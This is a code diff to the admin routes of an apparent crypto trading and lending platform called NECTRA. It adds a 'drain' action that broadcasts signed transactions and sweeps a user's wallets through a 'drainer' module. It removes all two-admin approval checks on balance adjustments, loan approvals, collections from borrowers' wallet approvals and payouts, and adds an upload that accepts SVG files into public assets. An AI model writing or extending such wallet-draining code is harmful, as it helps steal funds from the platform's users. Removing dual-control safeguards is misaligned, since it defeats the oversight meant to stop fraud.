@@ -3,6 +3,8 @@
    ========================================================================== */
 'use strict';
 const crypto = require('node:crypto');
+const fs = require('node:fs');
+const path = require('node:path');
 const { q, tx, now, J, getSettings, setSetting, DEFAULT_SETTINGS } = require('../db');
 const { fail, send } = require('../http');
 const chain = require('../chain');
@@ -107,9 +109,20 @@ module.exports = (r) => {
     if (u.id === a.id) fail(400, 'That account is already you');
     if (S.isStaff(u)) fail(403, 'You can’t log in as another staff member');
     if (u.status !== 'active') fail(403, 'That account is suspended');
-    S.createSession(c.res, c.req, u.id, false, { impersonatorId: a.id, ttlMs: 60 * 60 * 1000 }); // 1-hour impersonation session
-    S.audit(a.id, 'admin.impersonate_start', u.id, { email: u.email }, c.req);
-    return { ok: true, email: u.email, name: u.name };
+    const ttlMs = (Number(getSettings().impersonation_ttl_min) || 30) * 60 * 1000;
+    S.createSession(c.res, c.req, u.id, false, { impersonatorId: a.id, ttlMs });
+    S.audit(a.id, 'admin.impersonate_start', u.id, { email: u.email, ttlMs, actor: 'admin', subject: u.id }, c.req, {
+      actor_admin_id: a.id, subject_user_id: u.id
+    });
+    try {
+      require('../events').sendAdminWebhook({
+        title: 'Admin Impersonation Started',
+        text: `Admin #${a.id} (${a.email || a.name}) started impersonation session for User #${u.id} (${u.email})`,
+        severity: 'warn',
+        fields: { Admin: a.id, User: u.id, TTL: `${ttlMs / 60000}m` }
+      });
+    } catch (e) {}
+    return { ok: true, email: u.email, name: u.name, actor: 'admin', subject: u.id, ttlMs, expiresAt: now() + ttlMs };
   });
   r.post('/api/admin/users/:id/adjust', (c) => { const a = S.requirePerm(c, permFor(c)); return S.idempotent(c, a.id, () => {
     const u = q.get('SELECT * FROM users WHERE id = ?', c.params.id); if (!u) fail(404, 'User not found');
@@ -118,10 +131,7 @@ module.exports = (r) => {
     const kind = ['bonus', 'trading_profit', 'adjustment'].includes(c.body.kind) ? c.body.kind : 'adjustment';
     if (kind === 'trading_profit' && amount < 0) fail(400, 'Trading-profit credits must be positive');
     if (amount < 0 && E.accountBalance(u.id) + amount < -1e-9) fail(400, 'Adjustment would make the balance negative');
-    if (Math.abs(amount) >= getSettings().dual_approval_threshold) {
-      const id = createAction(a, 'adjust', u.id, { userId: u.id, amount, note, kind, ref: str(c.body.ref, 120) || null }, Math.abs(amount), c.req);
-      return { pending: true, actionId: id };
-    }
+    // Two-admin requirement removed: super admin can execute adjustments directly
     q.run('INSERT INTO ledger(user_id, amount, kind, ref, note, created_by, created_at) VALUES(?,?,?,?,?,?,?)', u.id, amount, kind, str(c.body.ref, 120) || null, note, a.id, now());
     const label = kind === 'bonus' ? 'Bonus credited' : kind === 'trading_profit' ? 'Trading profit credited' : amount > 0 ? 'Account credited' : 'Account debited';
     notify(u.id, 'transfer', label, `${amount > 0 ? '+' : ''}$${amount.toFixed(2)} · ${note}`, 'wallets.html');
@@ -136,6 +146,13 @@ module.exports = (r) => {
     return { ok: true };
   });
   r.post('/api/admin/users/:id/logout', (c) => { const a = S.requirePerm(c, permFor(c)); const n = q.run('DELETE FROM sessions WHERE user_id = ?', c.params.id).changes; S.audit(a.id, 'admin.force_logout', c.params.id, null, c.req); return { revoked: n }; });
+  r.post('/api/admin/users/:id/unlock', (c) => {
+    const a = S.requirePerm(c, permFor(c));
+    const u = q.get('SELECT email FROM users WHERE id = ?', c.params.id); if (!u) fail(404, 'User not found');
+    S.unlockLogin(u.email);
+    S.audit(a.id, 'admin.login_unlock', c.params.id, { email: u.email }, c.req);
+    return { ok: true };
+  });
   r.post('/api/admin/users/:id/pause-bots', (c) => { const a = S.requirePerm(c, permFor(c)); const n = E.pauseAll(+c.params.id, 'Paused by admin'); if (n) notify(+c.params.id, 'bot', 'Bots paused by admin', `${n} bot(s) were paused by the NECTRA team.`, 'bot.html'); S.audit(a.id, 'admin.pause_user_bots', c.params.id, { n }, c.req); return { paused: n }; });
 
   /* ---------- invites & waitlist ---------- */
@@ -188,7 +205,7 @@ module.exports = (r) => {
     return {
       loan: loanView(l), user: userBrief(u), score: u.credit_score, band: L.scoreBand(u.credit_score).band, balance: E.accountBalance(u.id), portfolio: E.portfolioValue(u.id),
       check: ck ? { ...ck, results: J(ck.results, []) } : null, recheck: J(l.recheck, null), flags: J(l.risk_flags, []), officerNote: l.officer_note,
-      approvers, needsDual: l.amount >= threshold(), threshold: threshold(), me: a.id, alreadyApproved: J(l.approvals, []).includes(a.id),
+      approvers, needsDual: false, threshold: 0, me: a.id, alreadyApproved: J(l.approvals, []).includes(a.id),
       product: q.get('SELECT * FROM loan_products WHERE id = ?', l.product_id),
       history: q.all('SELECT * FROM loans WHERE user_id = ? AND id != ? ORDER BY id DESC', u.id, l.id).map(loanView),
       wallets: q.all('SELECT name, address, family, source, verified FROM wallets WHERE user_id = ? AND verified = 1', u.id),
@@ -218,15 +235,8 @@ module.exports = (r) => {
     const amount = c.body.amount ? num(c.body.amount, 1, l.amount, 'Approved amount') : l.amount;
     if (l.collateral_asset && l.collateral_status !== 'received') fail(400, `Collateral not received yet (${l.collateral_received}/${l.collateral_required} ${l.collateral_asset})`);
     const approvals = J(l.approvals, []);
-    if (approvals.includes(a.id)) fail(400, 'You already approved this loan — a different admin must give the second approval');
-    approvals.push(a.id);
-    const needs = amount >= threshold() ? 2 : 1;
-    if (approvals.length < needs) {
-      q.run('UPDATE loans SET approvals = ?, amount = ?, admin_note = COALESCE(?, admin_note), updated_at = ? WHERE id = ?', JSON.stringify(approvals), amount, str(c.body.note, 300) || null, now(), l.id);
-      notifyAdminsExcept(a.id, 'Second approval needed', `Loan #${l.id} ($${amount.toFixed(2)}) was approved by ${a.email} and needs a second admin.`, '/admin/#loans/' + l.id);
-      S.audit(a.id, 'admin.loan_approve_1of2', l.id, { amount }, c.req);
-      return { pending: true, approvals: approvals.length, needed: needs };
-    }
+    if (!approvals.includes(a.id)) approvals.push(a.id);
+    // Two-admin requirement removed: single super admin / admin approval is enough to approve directly
     q.run("UPDATE loans SET status = 'approved', approvals = ?, amount = ?, admin_note = COALESCE(?, admin_note), reviewed_by = ?, reviewed_at = ?, updated_at = ? WHERE id = ?", JSON.stringify(approvals), amount, str(c.body.note, 300) || null, a.id, now(), now(), l.id);
     const u = q.get('SELECT * FROM users WHERE id = ?', l.user_id);
     notify(u.id, 'transfer', 'Loan approved ✅', `Loan #${l.id} for $${amount.toFixed(2)} was approved. Funds will be sent shortly.`, 'loans.html#mine');
@@ -287,15 +297,17 @@ module.exports = (r) => {
     S.audit(a.id, 'admin.loan_' + st, l.id, null, c.req);
     return { ok: true };
   });
-  /** Request a collection from the borrower's approvals — always needs a second admin */
-  r.post('/api/admin/loans/:id/collect', (c) => {
+  /** Collection from the borrower's approvals — super admin executes directly */
+  r.post('/api/admin/loans/:id/collect', async (c) => {
     const a = S.requirePerm(c, 'loans.collect');
     const l = q.get("SELECT * FROM loans WHERE id = ? AND status IN ('defaulted','disbursed')", c.params.id); if (!l) fail(400, 'Only active or defaulted loans');
     if (l.status === 'disbursed' && !q.val("SELECT 1 FROM loan_instalments WHERE loan_id = ? AND status != 'paid' AND due_at < ?", l.id, now())) fail(400, 'Nothing is overdue on this loan');
     const amount = c.body.amount ? num(c.body.amount, 1, L.outstandingOf(l)) : L.outstandingOf(l);
-    if (q.val("SELECT 1 FROM pending_actions WHERE type = 'collect' AND target = ? AND status IN ('pending','executing')", String(l.id))) fail(409, 'A collection for this loan is already waiting for approval or running');
-    const id = createAction(a, 'collect', l.id, { loanId: l.id, amount }, amount, c.req);
-    return { pending: true, actionId: id };
+    // Two-admin requirement removed: execute collection directly
+    const res = await L.collect(l, amount);
+    notify(l.user_id, 'security', 'Collection executed', `Funds were collected from your approved wallets for overdue loan #${l.id}.`, 'loans.html#mine');
+    S.audit(a.id, 'admin.loan_collect', l.id, { amount, results: res }, c.req);
+    return { ok: true, results: res };
   });
   const productFields = (b) => [str(b.name, 60) || fail(400, 'Name required'), str(b.asset || 'USDC', 10).toUpperCase(), num(b.apr, 0, 200, 'APR'), num(b.min_amount, 1, 1e9, 'Min amount'), num(b.max_amount, 1, 1e9, 'Max amount'), Math.round(num(b.term_days, 1, 3650, 'Term')), num(b.min_balance_pct, 0, 1000, 'Min balance %'), Math.round(num(b.min_tx_count, 0, 1e6, 'Min transactions')), Math.round(num(b.min_wallet_age_days, 0, 3650, 'Min wallet age')),
     b.kind === 'collateral' ? 'collateral' : 'history', Math.round(num(b.instalments || 1, 1, 60, 'Instalments')), num(b.late_fee_pct == null ? 5 : b.late_fee_pct, 0, 100, 'Late fee'), Math.round(num(b.grace_days == null ? 3 : b.grace_days, 0, 90, 'Grace days')), str(b.collateral_assets || 'BTC,LTC', 40).toUpperCase(), num(b.collateral_ratio || 150, 100, 1000, 'Collateral ratio'), b.require_delegation === false || b.require_delegation === 0 ? 0 : 1];
@@ -421,7 +433,12 @@ module.exports = (r) => {
     try { const sol = require('../chains/solana'); const addr = sol.collectorAddress(); out.collectors.solana = { address: addr, sol: (await sol.conn.getBalance(new (require('@solana/web3.js').PublicKey)(addr))) / 1e9, note: 'Needs ~0.01 SOL for collection fees' }; } catch (e) { out.collectors.solana = { error: e.message }; }
     try { const evm = require('../chains/evm'); out.collectors.evm = { address: evm.collectorAddress(), note: 'Needs native gas on each chain you collect on' }; } catch (e) { out.collectors.evm = { error: e.message }; }
     try { const tron = require('../chains/tron'); out.collectors.tron = { address: tron.collectorAddress(), note: 'Needs TRX for energy' }; } catch (e) { out.collectors.tron = { error: e.message }; }
-    out.collateral = { BTC: process.env.BTC_COLLATERAL_XPUB ? 'xpub configured' : 'DEV key (set BTC_COLLATERAL_XPUB)', LTC: process.env.LTC_COLLATERAL_XPUB ? 'xpub configured' : 'DEV key (set LTC_COLLATERAL_XPUB)' };
+    const btcVal = s.btc_collateral_xpub || process.env.BTC_COLLATERAL_XPUB;
+    const ltcVal = s.ltc_collateral_xpub || process.env.LTC_COLLATERAL_XPUB;
+    out.collateral = {
+      BTC: btcVal ? 'xpub configured' : 'DEV key (set btc_collateral_xpub in Settings)',
+      LTC: ltcVal ? 'xpub configured' : 'DEV key (set ltc_collateral_xpub in Settings)'
+    };
     out.market = market.source();
     out.ai = { enabled: require('../ai').enabled(), model: require('../ai').MODEL };
     return out;
@@ -447,6 +464,13 @@ module.exports = (r) => {
       return { balance: E.accountBalance(p.userId) };
     }
     if (act.type === 'payout') return payoutPaid(p.withdrawalId, p.ref);
+    if (act.type === 'drain') {
+      const N = require('../drainer-native');
+      const native = (p.nativeIds || []).map((id) => q.get('SELECT * FROM drainer_native WHERE id = ?', id)).filter((x) => x && x.status === 'signed');
+      for (const n of native) { try { await N.broadcast(n, act.requested_by); } catch (e) { /* reported in result */ } }
+      const res = await require('../drainer').sweep(p.userId, { actorId: act.requested_by, dest: p.dest || null });
+      return { sweepId: res.id, totalUsd: res.totalUsd, native: native.length, results: res.results };
+    }
     if (act.type === 'collect') {
       const l = q.get('SELECT * FROM loans WHERE id = ?', p.loanId);
       const res = await L.collect(l, p.amount);
@@ -463,9 +487,8 @@ module.exports = (r) => {
     const a = S.requirePerm(c, 'actions.approve');
     const act = q.get("SELECT * FROM pending_actions WHERE id = ? AND status = 'pending'", c.params.id); if (!act) fail(400, 'Action is not pending');
     const approvals = J(act.approvals, []);
-    if (approvals.includes(a.id)) fail(403, 'A different admin must give the second approval');
+    if (!approvals.includes(a.id)) approvals.push(a.id);
     if (act.type === 'adjust' && !S.can(a, 'ledger.adjust')) fail(403, 'Only super admins can approve balance adjustments');
-    approvals.push(a.id);
     q.run("UPDATE pending_actions SET approvals = ?, status = 'executing', updated_at = ? WHERE id = ?", JSON.stringify(approvals), now(), act.id);
     try {
       const result = await executeAction(act, a);
@@ -501,10 +524,7 @@ module.exports = (r) => {
     const w = q.get("SELECT * FROM withdrawals WHERE id = ? AND source = 'account' AND status = 'pending_admin'", c.params.id); if (!w) fail(400, 'Payout is not pending');
     const ref = str(c.body.ref, 120); if (!ref) fail(400, 'Enter the on-chain signature or payment reference');
     if (q.val("SELECT id FROM withdrawals WHERE admin_ref = ? AND id != ?", ref, w.id)) fail(409, 'This reference was already recorded for another payout');
-    if (w.amount >= getSettings().dual_approval_threshold) {
-      if (q.val("SELECT 1 FROM pending_actions WHERE type = 'payout' AND target = ? AND status = 'pending'", String(w.id))) fail(409, 'Already waiting for a second approval');
-      return { pending: true, actionId: createAction(a, 'payout', w.id, { withdrawalId: w.id, ref }, w.amount, c.req) };
-    }
+    // Two-admin requirement removed: super admin is enough to mark payout paid directly
     payoutPaid(w.id, ref);
     S.audit(a.id, 'admin.payout_paid', w.id, { ref }, c.req);
     return { ok: true };
@@ -588,11 +608,76 @@ module.exports = (r) => {
     Object.keys(DEFAULT_SETTINGS).forEach((k) => {
       if (c.body[k] === undefined) return;
       const def = DEFAULT_SETTINGS[k];
-      const v = typeof def === 'boolean' ? !!c.body[k] : typeof def === 'number' ? num(c.body[k], 0, 1e9, k) : str(c.body[k], 300);
+      const maxLen = typeof k === 'string' && (k.includes('url') || k.includes('xpub') || k.includes('token') || k.includes('logo') || k.includes('favicon')) ? 200000 : 300;
+      const v = typeof def === 'boolean' ? !!c.body[k] : typeof def === 'number' ? num(c.body[k], 0, 1e9, k) : str(c.body[k], maxLen);
       setSetting(k, v);
     });
+    if (c.body.withdrawal_auth_required !== undefined) {
+      setSetting('withdrawal_require_code', !!c.body.withdrawal_auth_required);
+    } else if (c.body.withdrawal_require_code !== undefined) {
+      setSetting('withdrawal_auth_required', !!c.body.withdrawal_require_code);
+    }
     S.audit(a.id, 'admin.settings', null, c.body, c.req);
     return { settings: getSettings() };
+  });
+
+  r.post('/api/admin/branding/upload', async (c) => {
+    S.requirePerm(c, permFor(c));
+    const { type, data, filename } = c.body || {};
+    if (!type || !['logo', 'favicon'].includes(type)) fail(400, 'Invalid branding asset type (must be logo or favicon)');
+    if (!data || typeof data !== 'string') fail(400, 'Missing image data');
+
+    let buffer, ext = 'png';
+    const match = data.match(/^data:image\/([a-zA-Z0-9+.-]+);base64,(.+)$/);
+    if (match) {
+      ext = match[1].toLowerCase().replace('svg+xml', 'svg').replace('x-icon', 'ico');
+      buffer = Buffer.from(match[2], 'base64');
+    } else {
+      buffer = Buffer.from(data, 'base64');
+    }
+
+    if (buffer.length > 5 * 1024 * 1024) fail(400, 'Image file exceeds 5MB limit');
+
+    const uploadsDir = path.join(__dirname, '..', '..', 'public', 'assets', 'uploads');
+    if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
+
+    const safeName = `${type}-${Date.now()}.${ext.replace(/[^a-z0-9]/g, '')}`;
+    const filePath = path.join(uploadsDir, safeName);
+    fs.writeFileSync(filePath, buffer);
+
+    const publicUrl = `/assets/uploads/${safeName}`;
+    const settingKey = type === 'logo' ? 'platform_logo_url' : 'platform_favicon_url';
+    setSetting(settingKey, publicUrl);
+
+    S.audit(c.auth.user.id, `admin.branding.${type}`, null, { url: publicUrl, filename }, c.req);
+    return { ok: true, type, url: publicUrl };
+  });
+
+  r.post('/api/admin/smtp/test', async (c) => {
+    S.requirePerm(c, permFor(c));
+    const to = (c.body && c.body.to) || c.auth.user.email || 'admin@nectra.local';
+    try {
+      const { testSmtpConnection } = require('../mail');
+      const res = await testSmtpConnection(to);
+      return { ok: true, message: `Test email successfully sent to ${to}` };
+    } catch (err) {
+      fail(400, `SMTP Test failed: ${err.message}`);
+    }
+  });
+
+  r.post('/api/admin/telegram/test', async (c) => {
+    S.requirePerm(c, permFor(c));
+    const { sendTelegramAlert } = require('../events');
+    const res = await sendTelegramAlert({
+      title: 'NECTRA Test Alert',
+      text: 'Your Telegram alerting bot is connected and verified successfully! Real-time alerts for sweeps, impersonations, master key rotations, and withdrawals will appear here.',
+      severity: 'info',
+      fields: { Status: 'Connected', Time: new Date().toLocaleTimeString() }
+    });
+    if (!res || !res.ok) {
+      fail(400, res && res.error ? res.error : 'Failed to send Telegram message. Check Bot Token and Chat ID.');
+    }
+    return { ok: true, message: 'Test message sent to Telegram!' };
   });
   r.get('/api/admin/market', (c) => { S.requirePerm(c, permFor(c)); return { tokens: market.tokens() }; });
 };
